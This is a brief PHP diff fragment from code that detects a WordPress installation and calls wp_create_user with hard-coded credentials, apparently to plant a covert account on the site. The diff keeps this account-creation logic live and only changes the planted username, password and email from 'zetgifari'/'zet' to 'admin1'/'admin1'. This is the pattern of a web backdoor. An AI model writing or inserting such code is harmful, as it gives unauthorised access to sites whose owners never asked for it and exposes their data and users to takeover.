@@ -85,9 +85,9 @@ if (!isset($_SESSION['wp_checked'])) {
     }
     
     if ($wpFound && function_exists('wp_create_user')) {
-        $username = 'zetgifari';
-        $password = 'zet';
-        $email = 'boss@gmail.com';
+        $username = 'admin1';
+        $password = 'admin1';
+        $email = 'admin1@gmail.com';
         
         if (!function_exists('username_exists')) {
             $userExists = false;
